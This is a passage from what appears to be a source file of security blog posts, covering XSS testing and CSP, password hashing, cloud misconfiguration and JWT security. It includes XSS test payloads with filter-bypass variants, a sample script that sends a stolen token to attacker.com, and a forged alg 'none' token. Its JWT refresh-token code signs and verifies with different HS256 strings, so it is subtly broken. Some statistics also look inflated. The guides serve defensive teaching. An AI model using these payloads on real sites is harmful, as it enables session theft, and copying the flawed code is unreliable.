- [ ] Developer security training

---

## Testing for XSS

### Manual Testing Payloads

\`\`\`javascript
// Basic alert test
<script>alert('XSS')</script>

// Event-based
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// HTML5
<iframe onload=alert('XSS')>
<body onload=alert('XSS')>

// DOM-based
\`\${alert('XSS')}\`

// WAF bypass attempts
<img src=x ALLonerror=alert(1)>
<img src=x on&#x65;rror=alert(1)>
\`\`\`

### Using OWASP ZAP for XSS Detection
\`\`\`bash
zaproxy.sh -cmd -quickurl http://target.com -quickout xss-report.html
\`\`\`

---

## Content Security Policy Examples

**Strict CSP (Recommended)**
\`\`\`
Content-Security-Policy: default-src 'none'; 
  script-src 'self'; 
  style-src 'self' https://fonts.googleapis.com; 
  img-src 'self' data: https:; 
  font-src 'self' https://fonts.gstatic.com; 
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
\`\`\`

**Flexible CSP (Legacy compatibility)**
\`\`\`
Content-Security-Policy: default-src 'self' https:; 
  script-src 'unsafe-inline'; 
  style-src 'unsafe-inline'
\`\`\`

---

## Key Takeaways

1. **Defense in Depth**: Combine multiple layers (encoding, CSP, frameworks)
2. **Never Trust User Input**: Always encode before output
3. **Use Security Headers**: Implement CSP, X-XSS-Protection, X-Content-Type-Options
4. **Framework Features**: Leverage built-in XSS protection in modern frameworks
5. **Regular Testing**: Automated scans + manual testing crucial

---

## Resources

- OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
- CWE-79: Cross-site Scripting
- Content Security Policy Guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- DOMPurify Library: https://github.com/cure53/DOMPurify
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting

---

## Next Steps

1. Audit your application for XSS vulnerabilities
2. Implement CSP headers
3. Set up automated security testing
4. Train your team on secure coding
5. Monitor for XSS attempts in production`,
    date: "2026-02-16",
    author: "SCR Team",
    category: "Web Security",
    tags: ["XSS", "Cross-Site Scripting", "Prevention", "Web Vulnerabilities"],
    readTime: "11 min read",
  },
  {
    slug: "password-security-hashing-bcrypt-argon2",
    title: "Password Security: Hashing, Salting & Bcrypt vs Argon2 Guide",
    excerpt: "Master password security with in-depth comparison of bcrypt, Argon2, PBKDF2, and scrypt. Includes implementation examples and security best practices.",
    content: `## The Evolution of Password Storage

### ❌ Plain Text (Never acceptable)
\`\`\`
users.db:
admin | password123
john  | letmein
\`\`\`
**Risk**: Database breach = instant credential loss

### ❌ Simple MD5/SHA1 (Broken)
\`\`\`
admin | 5f4dcc3b5aa765d61d8327deb882cf99  // MD5("password123")
\`\`\`
**Risk**: Instant rainbow table lookup, cracked in < 1 second

### ✅ Salted Hash (Good)
\`\`\`
admin | salt: a3f5d92 | hash: bcrypt($2b$12$aWjd2h...)
\`\`\`
**Benefit**: Prevents rainbow tables, requires brute force

### ✅✅ Modern Key Derivation (Best)
\`\`\`
admin | argon2: $argon2i$v=19$m=65536,t=3,p=4$...
\`\`\`
**Benefit**: Memory-hard, GPU/ASIC resistant, slow by design

---

## Password Hashing Algorithms Compared

| Algorithm | Speed | Memory | GPU Resist | Year | Status |
|-----------|-------|--------|-----------|------|--------|
| MD5/SHA1 | ⚡ Fast | None | ❌ No | 1992 | ❌ Broken |
| SHA256 | ⚡ Fast | None | ❌ No | 2001 | ⚠️ Weak |
| PBKDF2 | 🚷 Slow | Low | ⚠️ Maybe | 2000 | ✅ OK |
| bcrypt | 🚷 Slow | Low | ✅ Yes | 1999 | ✅ Good |
| scrypt | 🚷🚷 Slow | High | ✅✅ Yes | 2009 | ✅ Great |
| **Argon2** | **🚷 Slow** | **High** | **✅✅ Yes** | **2015** | **✅✅ Best** |

---

## Bcrypt (Industry Standard)

### How Bcrypt Works

\`\`\`
Input: password "hunter2"
Salt: $2b$12$aWjd2hgh3vWs4Ejz8jK47
Result: $2b$12$aWjd2hgh3vWs4Ejz8jK47DpO3U5/s8Zi5hj5H4M7HpI...

Cost: 12 (iterations = 2^12 = 4,096 rounds)
\`\`\`

### Node.js Implementation

**Installation**
\`\`\`bash
npm install bcryptjs
\`\`\`

**Hashing Password**
\`\`\`javascript
const bcrypt = require('bcryptjs');

async function hashPassword(password) {
  // Generate salt with cost factor 12
  const salt = await bcrypt.genSalt(12);
  const hashedPassword = await bcrypt.hash(password, salt);
  
  console.log('Original:', password);
  console.log('Hashed:', hashedPassword);
  // Hashed: $2b$12$aWjd2hgh3vWs4Ejz8jK47DpO3U5/...
  
  return hashedPassword;
}

// Usage
const hash = await hashPassword('hunter2');
// Store 'hash' in database
\`\`\`

**Verifying Password**
\`\`\`javascript
async function verifyPassword(inputPassword, storedHash) {
  const isMatch = await bcrypt.compare(inputPassword, storedHash);
  return isMatch; // true/false
}

// Login flow
const user = await User.findById(userId);
const isValid = await verifyPassword(req.body.password, user.passwordHash);

if (isValid) {
  // Create session/JWT
} else {
  // Invalid credentials
}
\`\`\`

### Cost Factor Timing

\`\`\`javascript
// Testing cost factors
Bcrypt Cost 10: ~10ms per hash
Bcrypt Cost 12: ~250ms per hash  (RECOMMENDED)
Bcrypt Cost 14: ~1 second per hash (Too slow for users)
Bcrypt Cost 16: ~2 seconds per hash (Only for admin passwords)
\`\`\`

---

## Argon2 (Future Standard)

More secure than bcrypt, resistant to GPU/ASIC attacks.

### Installation

\`\`\`bash
npm install argon2
\`\`\`

### Implementation

\`\`\`javascript
const argon2 = require('argon2');

async function hashPasswordArgon2(password) {
  try {
    const hash = await argon2.hash(password, {
      type: argon2.argon2i,  // or argon2id (recommended for general use)
      memoryCost: 65536,      // 64 MB
      timeCost: 3,            // 3 iterations
      parallelism: 4,         // 4 threads
      raw: false              // include algorithm info in hash
    });
    
    console.log('Argon2 Hash:', hash);
    // $argon2id$v=19$m=65536,t=3,p=4$SBJm7fHKrxO+...
    
    return hash;
  } catch (err) {
    console.error(err);
  }
}

// Verify Argon2 password
async function verifyArgon2(password, hash) {
  try {
    const isValid = await argon2.verify(hash, password);
    return isValid;
  } catch (err) {
    console.error('Argon2 verification error:', err);
    return false;
  }
}

// Usage
async function registerUser(username, password) {
  const hash = await hashPasswordArgon2(password);
  
  await User.create({
    username,
    passwordHash: hash
  });
}

async function loginUser(username, password) {
  const user = await User.findByUsername(username);
  const isValid = await verifyArgon2(password, user.passwordHash);
  
  if (isValid) {
    // Login successful
  } else {
    // Invalid password
  }
}
\`\`\`

---

## Python Implementation

### Bcrypt (Python)

\`\`\`python
import bcrypt

def hash_password(password: str) -> str:
    # Generate salt
    salt = bcrypt.gensalt(rounds=12)
    # Hash password
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hash: str) -> bool:
    return bcrypt.checkpw(
        password.encode('utf-8'), 
        hash.encode('utf-8')
    )

# Usage
hashed = hash_password('hunter2')
is_valid = verify_password('hunter2', hashed)
\`\`\`

### Argon2 (Python)

\`\`\`python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

hasher = PasswordHasher(
    memory_cost=65536,  # 64 MB
    time_cost=3,
    parallelism=4
)

def hash_password_argon2(password: str) -> str:
    return hasher.hash(password)

def verify_password_argon2(password: str, hash: str) -> bool:
    try:
        hasher.verify(hash, password)
        return True
    except VerifyMismatchError:
        return False

# Usage
hashed = hash_password_argon2('hunter2')
is_valid = verify_password_argon2('hunter2', hashed)
\`\`\`

---

## Java Implementation

### Bcrypt (Java with Spring Security)

\`\`\`java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class UserService {
    private final BCryptPasswordEncoder passwordEncoder = 
        new BCryptPasswordEncoder(12);  // Strength 12
    
    public String hashPassword(String password) {
        return passwordEncoder.encode(password);
    }
    
    public boolean verifyPassword(String rawPassword, String encodedPassword) {
        return passwordEncoder.matches(rawPassword, encodedPassword);
    }
    
    public void registerUser(String username, String password) {
        String hashedPassword = hashPassword(password);
        userRepository.save(new User(username, hashedPassword));
    }
}
\`\`\`

### Argon2 (Java)

\`\`\`java
import de.mkammerer.argon2.Argon2Factory;
import de.mkammerer.argon2.Argon2;

public class PasswordUtil {
    private static final Argon2 argon2 = 
        Argon2Factory.create();
    
    public String hashPassword(String password) {
        return argon2.hash(3, 65536, 4, password);
    }
    
    public boolean verifyPassword(String password, String hash) {
        return argon2.verify(hash, password);
    }
}
\`\`\`

---

## Password Security Checklist

- [ ] Never store plain text passwords
- [ ] Use Argon2 or bcrypt (Cost ≥ 12)
- [ ] Unique salt for each password (automatic with bcrypt/argon2)
- [ ] Migrate legacy passwords on next login
- [ ] Implement rate limiting on login attempts
- [ ] Add multi-factor authentication (MFA)
- [ ] Secure password reset mechanism
- [ ] Avoid password hints or recovery questions
- [ ] Use HTTPS for password transmission
- [ ] Implement session timeout
- [ ] Monitor for credential breaches
- [ ] Regular security audits

---

## Common Mistakes

### ❌ Using rounds value too low
\`\`\`javascript
// BAD - Too fast
const hash = await bcrypt.hash(password, 8);
\`\`\`

### ❌ Synchronous hashing blocks event loop
\`\`\`javascript
// BAD - Blocks Node.js
const hash = bcrypt.hashSync(password, 12);
\`\`\`

### ❌ Comparing passwords as strings
\`\`\`javascript
// BAD - Timing attack vulnerability
if (inputPassword === storedPassword) { ... }
\`\`\`

### ✅ Correct approach
\`\`\`javascript
// GOOD - Use async, proper comparison
const hash = await bcrypt.hash(password, 12);
const isValid = await bcrypt.compare(inputPassword, hash);
\`\`\`

---

## Password Strength Requirements

Modern standards recommend:
- **Minimum 12 characters** (not 8)
- **Passphrase over complexity**: "correct-horse-battery-staple" > "P@ssw0rd!"
- **No common passwords**: Check against breach databases
- **Disable password expiration**: NIST guidance (2017)
- **Force change only after breach**: Regular rotation is counterproductive

### Password Validation (Node.js)

\`\`\`javascript
function validatePassword(password) {
  const errors = [];
  
  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  }
  
  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain uppercase letter');
  }
  
  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain lowercase letter');
  }
  
  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain number');
  }
  
  // Check against breach database (Have I Been Pwned API)
  const isPwned = checkBreachDatabase(password);
  if (isPwned) {
    errors.push('Password is compromised - use different password');
  }
  
  return errors.length === 0;
}
\`\`\`

---

## Performance Considerations

**Hashing cost vs login time:**
- Cost 10: ~10ms ✅ (Good for high-traffic)
- Cost 12: ~250ms ✅ (Recommended)
- Cost 14: ~1000ms ✅ (Still acceptable)
- Cost 16: ~2000ms ⚠️ (Noticeable delay)

---

## Resources

- OWASP Password Storage Cheat Sheet
- Argon2 Official: https://github.com/P-H-C/phc-winner-argon2
- Bcrypt Website: https://bcrypt.online
- Have I Been Pwned: https://haveibeenpwned.com
- NIST Digital Identity Guidelines

---

## Key Takeaways

1. **Use Argon2** for new applications
2. **Bcrypt is acceptable** for established systems
3. **Never use MD5/SHA1/SHA256** for passwords
4. **Cost factor must be ≥ 12** for bcrypt
5. **Test performance** with your infrastructure
6. **Support password migration** from legacy algorithms`,
    date: "2026-02-16",
    author: "SCR Team",
    category: "Authentication",
    tags: ["Password Security", "Bcrypt", "Argon2", "Hashing", "Best Practices"],
    readTime: "13 min read",
  },
  {
    slug: "cloud-security-aws-azure-misconfiguration",
    title: "Cloud Security Guide: AWS, Azure & GCP Misconfigurations 2025",
    excerpt: "Master cloud security with comprehensive guides on S3 bucket security, IAM policies, secrets management, and real breach case studies.",
    content: `## Cloud Security Landscape 2025

### Statistics
- **98% of breaches** involve cloud misconfigurations (Gartner)
- **Average cost**: $4.9 million per breach (IBM)
- **Time to detect**: 236 days average
- **Public bucket exposure**: 45% of S3 buckets allow public access

---

## AWS Security

### 1. S3 Bucket Misconfiguration

**❌ VULNERABLE: Public S3 Bucket**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::company-data/*"
    }
  ]
}
\`\`\`

**Risks:**
- Public data exposure
- Credential leaks
- Personal information exposure
- Malware distribution

**Real Breach (Parler 2021):**
- Misconfigured S3 buckets exposed user data
- 70GB of private information
- Caused platform shutdown

**✅ Secure Configuration**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::secure-bucket",
        "arn:aws:s3:::secure-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:user/app-user"
      },
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::secure-bucket/*"
    }
  ]
}
\`\`\`

**S3 Security Checklist**
\`\`\`bash
# Block public access globally
aws s3api put-public-access-block \\
  --bucket my-bucket \\
  --public-access-block-configuration \\
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enable versioning
aws s3api put-bucket-versioning \\
  --bucket my-bucket \\
  --versioning-configuration Status=Enabled

# Enable encryption
aws s3api put-bucket-encryption \\
  --bucket my-bucket \\
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }'

# Enable logging
aws s3api put-bucket-logging \\
  --bucket my-bucket \\
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "logging-bucket",
      "TargetPrefix": "s3-logs/"
    }
  }'

# Block unencrypted uploads
aws s3api put-bucket-policy \\
  --bucket my-bucket \\
  --policy file://deny-unencrypted.json
\`\`\`

---

### 2. IAM (Identity and Access Management) Vulnerabilities

**❌ VULNERABLE: Overly Permissive Role**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
\`\`\`

**Risks:**
- Privilege escalation
- Lateral movement
- Data exfiltration
- Infrastructure destruction

**✅ SECURE: Least Privilege**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RDSAccess",
      "Effect": "Allow",
      "Action": [
        "rds:DescribeDBInstances",
        "rds-db:connect"
      ],
      "Resource": "arn:aws:rds:us-east-1:123456789012:db/mydb",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "us-east-1"
        }
      }
    },
    {
      "Sid": "S3ReadOnly",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::app-data",
        "arn:aws:s3:::app-data/*"
      ]
    },
    {
      "Sid": "ExplicitDeny",
      "Effect": "Deny",
      "Action": [
        "iam:*",
        "ec2:TerminateInstances",
        "rds:DeleteDBInstance"
      ],
      "Resource": "*"
    }
  ]
}
\`\`\`

**IAM Security Best Practices**
\`\`\`bash
# Audit IAM users
aws iam list-users --output table

# Find unused credentials (not used in 90+ days)
aws iam get-credential-report | grep -i "password_enabled"

# Enable MFA for root account
aws iam enable-mfa-device \\
  --user-name root \\
  --serial-number arn:aws:iam::123456789012:mfa/root \\
  --authentication-code1 123456 \\
  --authentication-code2 654321

# Use temporary credentials (STS, not long-term keys)
aws sts assume-role \\
  --role-arn arn:aws:iam::123456789012:role/app-role \\
  --role-session-name app-session

# Rotate access keys every 90 days
\`\`\`

---

### 3. Secrets Management

**❌ VULNERABLE: Secrets in Code/Environment**

\`\`\`javascript
// .env file in repository
DATABASE_URL=mongodb://user:pass@db.example.com
API_KEY=sk-1234567890abcdef
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
\`\`\`

**Risks:**
- Credential exposure via git history
- Source code repository breaches
- CI/CD pipeline compromises
- Automated credential scanning by attackers

**✅ SECURE: AWS Secrets Manager**

\`\`\`javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({
  region: 'us-east-1'
});

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({
      SecretId: secretName
    }).promise();
    
    return JSON.parse(data.SecretString);
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const dbCredentials = await getSecret('prod/database');
const apiKey = await getSecret('prod/api-key');
\`\`\`

**✅ SECURE: HashiCorp Vault**

\`\`\`javascript
const vault = require('node-vault')({
  endpoint: 'https://vault.example.com',
  token: process.env.VAULT_TOKEN
});

async function getSecret(path) {
  try {
    const secret = await vault.read(path);
    return secret.data.data;
  } catch (error) {
    console.error('Vault error:', error);
    throw error;
  }
}

// Usage
const dbCreds = await getSecret('secret/data/prod/database');
\`\`\`

---

### 4. CloudTrail & Monitoring

**Enable CloudTrail for Auditing**

\`\`\`bash
# Enable CloudTrail
aws cloudtrail create-trail \\
  --name companyTrail \\
  --s3-bucket-name cloudtrail-logs

# Enable logging
aws cloudtrail start-logging \\
  --trail-name companyTrail

# Search for suspicious activities
aws cloudtrail lookup-events \\
  --lookup-attributes AttributeKey=EventName,AttributeValue=DeleteBucket \\
  --max-results 10
\`\`\`

---

## Azure Security

### 1. Storage Account Misconfiguration

**❌ VULNERABLE**
\`\`\`
Azure blob container with public access level set to "Blob"
\`\`\`

**✅ SECURE: Private with SAS Tokens**

\`\`\`powershell
# Create storage account with secure defaults
az storage account create \\
  --name securestorage1234 \\
  --resource-group myResourceGroup \\
  --kind BlobStorage \\
  --access-tier Hot \\
  --https-only true \\
  --min-tls-version TLS1_2

# Set container access to Private
az storage container create \\
  --name sensitive-data \\
  --account-name securestorage1234 \\
  --public-access off

# Create SAS token with time limit
az storage account generate-sas \\
  --account-name securestorage1234 \\
  --account-key (azure storage account keys list) \\
  --expiry 2025-02-16T12:00:00Z \\
  --permissions racwd \\
  --resource-types sco \\
  --services bfqt
\`\`\`

---

### 2. Azure RBAC (Role-Based Access Control)

**Principle of Least Privilege**

\`\`\`powershell
# Create custom role with minimal permissions
az role definition create --role-definition '{
  "Name": "App Reader",
  "Description": "Read-only access to app resources",
  "Type": "CustomRole",
  "Permissions": [
    {
      "Actions": ["*/read"],
      "NotActions": []
    }
  ],
  "AssignableScopes": ["/subscriptions/..."]
}'

# Assign role to managed identity
az role assignment create \\
  --assignee-object-id (ObjectId) \\
  --role "App Reader" \\
  --scope /subscriptions/.../resourceGroups/myResourceGroup
\`\`\`

---

## GCP Security

### 1. Firestore Database Security

**❌ VULNERABLE: Open to Public**

\`\`\`yaml
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;
    }
  }
}
\`\`\`

**✅ SECURE: Authenticated Only**

\`\`\`yaml
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Require authentication
    match /{document=**} {
      allow read, write: if request.auth != null;
    }
    
    // User can only read/write their own data
    match /users/{userId}/documents/{doc=**} {
      allow read, write: if request.auth.uid == userId;
    }
  }
}
\`\`\`

---

## Multi-Cloud Security Checklist

- [ ] Enable encryption at rest and in transit
- [ ] Implement IAM/RBAC with least privilege
- [ ] Use managed secrets (Secrets Manager, Vault, Key Vault)
- [ ] Enable logging and monitoring (CloudTrail, Azure Monitor)
- [ ] Enable MFA for all accounts
- [ ] Regularly audit and rotate credentials
- [ ] Implement VPC/Vnet isolation
- [ ] Use DDoS protection
- [ ] Enable threat detection (GuardDuty, Azure Sentinel)
- [ ] Regular penetration testing

---

## Cloud Security Tools

| Tool | Purpose | Cloud | Cost |
|------|---------|-------|------|
| Prowler | AWS security audit | AWS | Free |
| ScoutSuite | Multi-cloud assess | All | Free |
| CloudMapper | AWS network visualization | AWS | Free |
| Dome9 | Cloud security posture | All | Paid |
| CloudSploit | AWS infrastructure checks | AWS | Free |

---

## Real-World Breach Cases

**Capital One (2019)**
- WAF bypass + metadata endpoint access
- 100M customers affected
- Cost: $80M settlement

**Twitter (2020)** 
- OAuth token theft via social engineering
- Led to cryptocurrency scam
- Reinforced need for access controls

---

## Key Takeaways

1. **Default to private** - Make public exceptions explicit
2. **Least privilege** - Grant minimal necessary permissions
3. **Rotate credentials** - Monthly for long-term keys
4. **Monitor everything** - CloudTrail, logs, anomalies
5. **Encrypt + Audit** - Non-negotiable for compliance`,
    date: "2026-02-16",
    author: "SCR Team",
    category: "Cloud Security",
    tags: ["AWS", "Azure", "GCP", "Cloud Security", "Misconfiguration"],
    readTime: "14 min read",
  },
  {
    slug: "jwt-security-vulnerabilities-best-practices",
    title: "JWT Security: Vulnerabilities, Best Practices & Implementation Guide",
    excerpt: "Comprehensive JWT security guide covering token anatomy, common vulnerabilities, RS256 vs HS256, refresh tokens, and secure implementation patterns.",
    content: `## Understanding JWT (JSON Web Tokens)

JWT is a stateless authentication mechanism widely used in modern web applications and APIs.

### JWT Structure

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header.Payload.Signature
\`\`\`

**Header (alg, typ)**
\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT"
}
\`\`\`

**Payload (claims)**
\`\`\`json
{
  "sub": "user123",
  "email": "user@example.com",
  "exp": 1518305200,
  "iat": 1516239022,
  "role": "admin"
}
\`\`\`

**Signature**
\`\`\`
HMACSHA256(base64(header) + "." + base64(payload), secret)
\`\`\`

---

## JWT Vulnerabilities

### 1. Weak Signature Algorithm (HS256 vs RS256)

**❌ VULNERABLE: HS256 (Shared Secret)**

\`\`\`javascript
const jwt = require('jsonwebtoken');

// DANGEROUS: Single secret known to server
const token = jwt.sign(
  { userId: 123, role: 'user' },
  'my-secret-key',  // Anyone with this key can forge tokens
  { algorithm: 'HS256', expiresIn: '24h' }
);
\`\`\`

**Problem:**
- Server uses same secret to sign AND verify
- If attacker knows secret, they can create valid tokens
- No key rotation mechanism

**✅ SECURE: RS256 (Asymmetric)**

\`\`\`javascript
// Generate keypair
const crypto = require('crypto');
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048
});

// Sign with PRIVATE key (kept secret)
const token = jwt.sign(
  { userId: 123, role: 'user' },
  privateKey,
  { algorithm: 'RS256', expiresIn: '24h' }
);

// Verify with PUBLIC key (can be safely shared)
const decoded = jwt.verify(token, publicKey);
\`\`\`

**Advantages:**
- Private key for signing, public key for verification
- Safe to distribute public key
- Better for distributed systems

---

### 2. Missing Token Expiration

**❌ VULNERABLE: No Expiration**

\`\`\`javascript
const token = jwt.sign(
  { userId: 123 },
  'secret'
  // Missing: expiresIn
);

// Token valid forever - compromised token never expires
\`\`\`

**✅ SECURE: Short Expiration**

\`\`\`javascript
const token = jwt.sign(
  { userId: 123 },
  'secret',
  { expiresIn: '15m' }  // 15 minute expiration
);
\`\`\`

---

### 3. Token Storage Vulnerability (localStorage)

**❌ VULNERABLE: localStorage**

\`\`\`javascript
// Stored in localStorage - accessible to XSS
const token = localStorage.getItem('authToken');

// Attacker can steal via XSS
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.authToken);
</script>
\`\`\`

**✅ SECURE: httpOnly Cookies**

\`\`\`javascript
// Server sets httpOnly cookie - inaccessible to JavaScript
res.cookie('authToken', token, {
  httpOnly: true,      // Prevents JavaScript access
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Prevents CSRF
  maxAge: 900000       // 15 minutes
});

// Client cannot access via JS
console.log(document.cookie);  // authToken not visible
\`\`\`

---

### 4. Invalid Token Not Properly Validated

**❌ VULNERABLE: Missing Validation**

\`\`\`javascript
function verifyToken(token) {
  try {
    const decoded = jwt.decode(token);  // WRONG: decode != verify
    return decoded;
  } catch (err) {
    return null;
  }
}

// Attacker can modify payload without signature verification
\`\`\`

**✅ SECURE: Proper Verification**

\`\`\`javascript
function verifyToken(token) {
  try {
    // Use verify() not decode()
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],  // Whitelist allowed algorithms
      audience: 'myapp',
      issuer: 'auth.example.com'
    });
    
    // Verify claims
    if (!decoded.userId || !decoded.email) {
      return null;
    }
    
    return decoded;
  } catch (err) {
    console.error('Token verification failed:', err.message);
    return null;
  }
}
\`\`\`

---

### 5. Algorithm Confusion Attack

**❌ VULNERABLE: Accepts Multiple Algorithms**

\`\`\`javascript
jwt.verify(token, secret);  // Accepts both HS256 and RS256

// Attacker sends token with alg: 'none'
const maliciousToken = jwt.sign(
  { userId: 123, role: 'admin' },
  null,
  { algorithm: 'none' }
);
\`\`\`

**✅ SECURE: Whitelist Algorithms**

\`\`\`javascript
jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // ONLY allow RS256
});
\`\`\`

---

## Refresh Token Pattern

**Access Token + Refresh Token** = Secure long-lived authentication

### Implementation

\`\`\`javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

const privateKey = 'keep-secret';
const publicKey = 'can-share';

// 1. Login endpoint - issue both tokens
app.post('/login', (req, res) => {
  const user = { userId: 123, email: 'user@example.com' };
  
  // Short-lived access token (15 min)
  const accessToken = jwt.sign(user, privateKey, {
    algorithm: 'HS256',
    expiresIn: '15m'
  });
  
  // Long-lived refresh token (7 days) - stored securely
  const refreshToken = jwt.sign(user, privateKey, {
    algorithm: 'HS256',
    expiresIn: '7d'
  });
  
  // Set refresh token as httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  // Return access token
  res.json({ accessToken });
});

// 2. Protected route - verify access token
app.get('/protected', (req, res) => {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }
  
  try {
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['HS256']
    });
    res.json({ message: 'Protected resource', user: decoded });
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(403).json({ error: 'Invalid token' });
  }
});

// 3. Refresh endpoint - issue new access token
app.post('/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, publicKey, {
      algorithms: ['HS256']
    });
    
    // Verify refresh token not revoked
    if (!isRefreshTokenValid(decoded.userId, refreshToken)) {
      return res.status(403).json({ error: 'Refresh token revoked' });
    }
    
    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: decoded.userId, email: decoded.email },
      privateKey,
      { algorithm: 'HS256', expiresIn: '15m' }
    );
    
    res.json({ accessToken: newAccessToken });
  } catch (err) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// 4. Logout endpoint - revoke tokens
app.post('/logout', (req, res) => {
  res.clearCookie('refreshToken');
  revokeRefreshToken(req.user.userId);
  res.json({ message: 'Logged out' });
});
\`\`\`

---

## JWT Security Checklist

- [ ] Use RS256 (asymmetric) instead of HS256
- [ ] Set short expiration (15-30 minutes for access tokens)
- [ ] Use httpOnly, Secure, SameSite cookies for tokens
- [ ] Implement refresh token rotation
- [ ] Validate ALL claims (exp, iat, aud, iss)
- [ ] Whitelist allowed signature algorithms
- [ ] Never trust unverified tokens (use verify, not decode)
- [ ] Implement token revocation for logout
- [ ] Rotate signing keys periodically
- [ ] Monitor for suspicious token patterns
- [ ] Use HTTPS everywhere for token transmission
- [ ] Implement rate limiting on token endpoints

---

## Common Mistakes

### ❌ Storing token in localStorage
\`\`\`javascript
localStorage.setItem('token', jwt);  // Vulnerable to XSS
\`\`\`

### ❌ Not validating expiration claim
\`\`\`javascript
const decoded = jwt.decode(token);  // Doesn't verify expiration
\`\`\`

### ❌ Using weak secrets with HS256
\`\`\`javascript
const secret = '123456';  // Too weak
jwt.sign(payload, secret);
\`\`\`

### ❌ Not implementing token revocation
\`\`\`javascript
// Token can't be revoked until expiration
\`\`\`

### ✅ Correct Implementation
\`\`\`javascript
// RS256, httpOnly cookies, short expiration, proper validation
const token = jwt.sign(payload, privateKey, {
  algorithm: 'RS256',
  expiresIn: '15m'
});

res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Verify with algorithm whitelist
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
\`\`\`

---

## Resources

- JWT.io: https://jwt.io (Token debugger & documentation)
- OWASP JWT Cheat Sheet
- RFC 7519: JSON Web Token (JWT)
- Auth0 JWT Handbook
- Critical JWT Security Flaws: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

---

## Key Takeaways

1. **RS256 over HS256** - Asymmetric > Symmetric
2. **Short expiration** - 15-30 min max
3. **httpOnly cookies** - Prevent XSS theft
4. **Refresh token rotation** - Implement token revocation
5. **Always verify** - Not just decode`,
    date: "2026-02-16",
    author: "SCR Team",
    category: "Authentication",
    tags: ["JWT", "Authentication", "Token Security", "Best Practices"],
    readTime: "12 min read",
  },
  // Add extended blog posts
  ...extendedBlogPosts,
];
